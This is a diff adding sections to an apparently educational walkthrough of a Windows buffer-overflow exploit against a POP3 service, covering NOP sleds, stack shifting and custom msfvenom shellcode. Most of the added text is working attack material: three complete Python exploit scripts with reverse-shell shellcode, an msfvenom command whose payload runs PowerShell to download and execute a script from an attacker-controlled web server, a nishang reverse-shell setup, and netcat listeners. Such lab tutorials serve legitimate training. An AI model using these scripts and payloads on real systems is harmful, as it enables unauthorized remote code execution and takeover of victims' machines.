@@ -485,6 +485,10 @@ msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.50
 "\xac"
 ```
 
+----
+> Sometimes if there are many badchars the *shikata_ga_nai* encoder will not be able to generate the *shellcode*, to solve this we should not indicate any encoder and let *msfvenom* handle it.
+----
+
 Now we must modify the *exploit.py* script to include our *shellcode*, adding the above output.
 
 Before that, we also have to keep in mind that the *EIP* currently *points to 42424242* (*BBBB*), but we have to try to *point it to the stack* because that is where our *shellcode* will be hosted. Since we can't tell the *EIP* where to point, we have to try to find an *opcode* that performs the jump to the *ESP* (*JMP ESP*). For this we are going to use *Mona*:
@@ -583,3 +587,282 @@ When we execute the script, if everything has gone well, in the point where the 
 If we click on "*Step into*" we can see that the *ESP* value is now the same as the *EIP*, this is because *EIP* is going to point to the *ESP* in the next step.
 
 Right now the *shellcode* will not be interpreted, we have to give it a *space*. We will see this in the next section.
+
+## Use of NOPs, stack offsets and Shellcode interpretation to achieve RCE
+
+Once the address of the opcode that applies the jump to the *ESP* register has been found, the shellcode may not be interpreted correctly because its execution may require more time than the processor has available before proceeding to the next instruction in the program.
+
+To solve this problem, techniques such as inserting *NOPS* (*no operation instructions*) before the shellcode on the stack are often used. *NOPS* do not perform any operation, but allow the processor additional time to interpret the shellcode before continuing with the next instruction in the program.
+
+Another technique often used is stack shifting, which involves modifying the ESP register to reserve additional space for the shellcode and allow it to run smoothly. For example, the instruction "*sub esp, 0x10*" can be used to move the *ESP* register *16 bytes* down the stack to reserve additional space for the shellcode.
+
+----
+
+To use *NOPs* we can include, for example, *32 bytes* in the payload *between the EIP and our shellcode*:
+
+```python
+#!/usr/bin/python3
+
+import socket
+from struct import pack
+
+# Global variables
+ip_address = "192.168.50.167"
+port = 110
+offset = 4654
+
+before_eip = b"A"*offset
+eip = pack("<L", 0x5f4a358f)
+shell_code = (b"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
+b"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
+b"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
+b"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
+b"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
+b"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
+b"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
+b"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
+b"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
+b"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
+b"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
+b"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
+b"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
+b"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
+b"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
+b"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
+b"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
+b"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
+b"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
+b"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
+b"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
+b"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
+b"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
+b"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
+b"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
+b"\xac")
+
+payload = before_eip + eip + b"\x90"*32 + shell_code
+
+def exploit():
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Connect to the server
+    s.connect((ip_address, port))
+
+    # Receive the banner
+    banner = s.recv(1024)
+
+    s.send(b"USER loki" + b'\r\n')
+    response = s.recv(1024)
+
+    s.send(b"PASS " + payload + b'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+Now we can open port *443* to listen, as we had specified with **msfvenom**, using **netcat** and the *rlwrap* utility to be able to do things in *Windows* like *CTRL+L* and be more comfortable:
+
+```bash
+rlwrap nc -nlvp 443
+```
+
+Executing *exploit.py* will give us a *reverse shell*.
+
+If we do not want to apply *NOPs*, we can also apply a *stack offset* with *nasm_shell*. With this instruction we will move the *ESP* register *32 bytes down the stack* and *reserve additional space for the shellcode*:
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+# If we enter 'SUB ESP,0x20' the output will be '83EC20', which translates to '\x83\xEC\x20'.
+```
+
+We reflect it in the script, and when we execute it we will obtain the *reverse shell*:
+
+```python
+#!/usr/bin/python3
+
+import socket
+from struct import pack
+
+# Global variables
+ip_address = "192.168.50.167"
+port = 110
+offset = 4654
+
+before_eip = b"A"*offset
+eip = pack("<L", 0x5f4a358f)
+shell_code = (b"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
+b"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
+b"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
+b"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
+b"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
+b"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
+b"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
+b"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
+b"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
+b"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
+b"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
+b"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
+b"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
+b"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
+b"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
+b"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
+b"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
+b"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
+b"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
+b"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
+b"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
+b"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
+b"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
+b"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
+b"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
+b"\xac")
+
+payload = before_eip + eip + b"\x83\xEC\x20" + shell_code
+
+def exploit():
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Connect to the server
+    s.connect((ip_address, port))
+
+    # Receive the banner
+    banner = s.recv(1024)
+
+    s.send(b"USER loki" + b'\r\n')
+    response = s.recv(1024)
+
+    s.send(b"PASS " + payload + b'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+## Modification of the Shellcode to control the command to be executed
+
+In addition to the above payloads, it is also possible to use payloads such as "*windows/exec*" to directly load the command to be executed in the *CMD* variable of the payload. This allows you to create a new shellcode that, once interpreted, will directly execute the desired instruction.
+
+The "*windows/exec*" payload is a Metasploit payload that allows you to execute an arbitrary command on the target machine. This payload requires the command to be executed to be specified through the CMD variable in the payload. When generating the shellcode with msfvenom, the parameter "-p windows/exec CMD=<command>" can be used to specify the command to be executed.
+
+Once the shellcode is generated with the desired command, the buffer overflow technique can be used to overwrite the EIP register and cause the program flow to enter the shellcode. When the shellcode is interpreted, the command specified in the CMD variable will be executed directly.
+
+----
+
+We are going to generate a new shellcode with **msfvenom**, but this time we will use the *payload* *windows/exec*, which will allow us to pass the parameter we want in the *CMD* variable:
+
+```bash
+# We delete the port and IP because we are going to specify it to download the PS.ps1 file from our HTTP server
+msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.50.172/PS.ps1')" --platform windows -a x86 -b '\x00\x0a\x0d' -f c EXITFUNC=thread
+
+# Output
+"\xd9\xc5\xd9\x74\x24\xf4\x5d\xbe\x22\x9f\xd1\xb8\x29\xc9"
+"\xb1\x45\x31\x75\x17\x83\xed\xfc\x03\x57\x8c\x33\x4d\x6b"
+"\x5a\x31\xae\x93\x9b\x56\x26\x76\xaa\x56\x5c\xf3\x9d\x66"
+"\x16\x51\x12\x0c\x7a\x41\xa1\x60\x53\x66\x02\xce\x85\x49"
+"\x93\x63\xf5\xc8\x17\x7e\x2a\x2a\x29\xb1\x3f\x2b\x6e\xac"
+"\xb2\x79\x27\xba\x61\x6d\x4c\xf6\xb9\x06\x1e\x16\xba\xfb"
+"\xd7\x19\xeb\xaa\x6c\x40\x2b\x4d\xa0\xf8\x62\x55\xa5\xc5"
+"\x3d\xee\x1d\xb1\xbf\x26\x6c\x3a\x13\x07\x40\xc9\x6d\x40"
+"\x67\x32\x18\xb8\x9b\xcf\x1b\x7f\xe1\x0b\xa9\x9b\x41\xdf"
+"\x09\x47\x73\x0c\xcf\x0c\x7f\xf9\x9b\x4a\x9c\xfc\x48\xe1"
+"\x98\x75\x6f\x25\x29\xcd\x54\xe1\x71\x95\xf5\xb0\xdf\x78"
+"\x09\xa2\xbf\x25\xaf\xa9\x52\x31\xc2\xf0\x38\xc4\x50\x8f"
+"\x0f\xc6\x6a\x8f\x3f\xaf\x5b\x04\xd0\xa8\x63\xcf\x94\x57"
+"\x86\xc5\xe0\xff\x1f\x8c\x48\x62\xa0\x7b\x8e\x9b\x23\x89"
+"\x6f\x58\x3b\xf8\x6a\x24\xfb\x11\x07\x35\x6e\x15\xb4\x36"
+"\xbb\x65\x55\xbe\x21\xf7\xda\x28\xcf\x9b\x70\x89\x46\x26"
+"\xd1\xe1\x16\xcd\x96\xdc\xe9\x6f\x33\x7a\x95\x1b\xe3\xca"
+"\x3c\x97\xcd\x85\xdb\x35\x51\x46\x4d\xdc\x3b\xe2\xa4\x30"
+"\xa0\x65\xc0\x22\x44\x15\x4f\xde\xc7\x9d\xfd\x77\x86\x3a"
+"\x2a\xa0\x3e\xb1\x5e\xde\x84\x16\xb0\x2f\xc0\x5a\xe0\x7e"
+"\x04\xa3\xd2\xb5\x58\xfd\x1b\x82\xaa\x2e\x0c\xbf\xe4\x40"
+"\xdf\x0e\xde\x89\x1f"
+```
+
+In this case, the *payload* will download a *PS.ps1* file that we will be sharing with a *Python* server. To download the script we can download the following resource and rename it to *PS.ps1*:
+
+```bash
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+mv Invoke-PowerShellTcp.ps1 PS.ps1
+```
+
+To set the *reverse shell* directly, we must open the *PS.ps1* file and add the following line at the end with our *IP* and the desired *port*:
+
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.50.172 -Port 443
+```
+
+We add the above shellcode to our *exploit.py* script:
+
+```python
+#!/usr/bin/python3
+
+import socket
+from struct import pack
+
+# Global variables
+ip_address = "192.168.50.167"
+port = 110
+offset = 4654
+
+before_eip = b"A"*offset
+eip = pack("<L", 0x5f4a358f)
+shell_code = (b"\xd9\xc5\xd9\x74\x24\xf4\x5d\xbe\x22\x9f\xd1\xb8\x29\xc9"
+b"\xb1\x45\x31\x75\x17\x83\xed\xfc\x03\x57\x8c\x33\x4d\x6b"
+b"\x5a\x31\xae\x93\x9b\x56\x26\x76\xaa\x56\x5c\xf3\x9d\x66"
+b"\x16\x51\x12\x0c\x7a\x41\xa1\x60\x53\x66\x02\xce\x85\x49"
+b"\x93\x63\xf5\xc8\x17\x7e\x2a\x2a\x29\xb1\x3f\x2b\x6e\xac"
+b"\xb2\x79\x27\xba\x61\x6d\x4c\xf6\xb9\x06\x1e\x16\xba\xfb"
+b"\xd7\x19\xeb\xaa\x6c\x40\x2b\x4d\xa0\xf8\x62\x55\xa5\xc5"
+b"\x3d\xee\x1d\xb1\xbf\x26\x6c\x3a\x13\x07\x40\xc9\x6d\x40"
+b"\x67\x32\x18\xb8\x9b\xcf\x1b\x7f\xe1\x0b\xa9\x9b\x41\xdf"
+b"\x09\x47\x73\x0c\xcf\x0c\x7f\xf9\x9b\x4a\x9c\xfc\x48\xe1"
+b"\x98\x75\x6f\x25\x29\xcd\x54\xe1\x71\x95\xf5\xb0\xdf\x78"
+b"\x09\xa2\xbf\x25\xaf\xa9\x52\x31\xc2\xf0\x38\xc4\x50\x8f"
+b"\x0f\xc6\x6a\x8f\x3f\xaf\x5b\x04\xd0\xa8\x63\xcf\x94\x57"
+b"\x86\xc5\xe0\xff\x1f\x8c\x48\x62\xa0\x7b\x8e\x9b\x23\x89"
+b"\x6f\x58\x3b\xf8\x6a\x24\xfb\x11\x07\x35\x6e\x15\xb4\x36"
+b"\xbb\x65\x55\xbe\x21\xf7\xda\x28\xcf\x9b\x70\x89\x46\x26"
+b"\xd1\xe1\x16\xcd\x96\xdc\xe9\x6f\x33\x7a\x95\x1b\xe3\xca"
+b"\x3c\x97\xcd\x85\xdb\x35\x51\x46\x4d\xdc\x3b\xe2\xa4\x30"
+b"\xa0\x65\xc0\x22\x44\x15\x4f\xde\xc7\x9d\xfd\x77\x86\x3a"
+b"\x2a\xa0\x3e\xb1\x5e\xde\x84\x16\xb0\x2f\xc0\x5a\xe0\x7e"
+b"\x04\xa3\xd2\xb5\x58\xfd\x1b\x82\xaa\x2e\x0c\xbf\xe4\x40"
+b"\xdf\x0e\xde\x89\x1f")
+
+payload = before_eip + eip + b"\x90"*32 + shell_code
+
+def exploit():
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Connect to the server
+    s.connect((ip_address, port))
+
+    # Receive the banner
+    banner = s.recv(1024)
+
+    s.send(b"USER loki" + b'\r\n')
+    response = s.recv(1024)
+
+    s.send(b"PASS " + payload + b'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+Now we can share our resource with *Python*, leave port *443* listening and run our script to gain access (this time with a *PoweShell* console) to the victim machine:
+
+```bash
+python3 -m http.server 80
+
+rlwrap nc -nlvp 443
+
+python3 exploit.py
+```
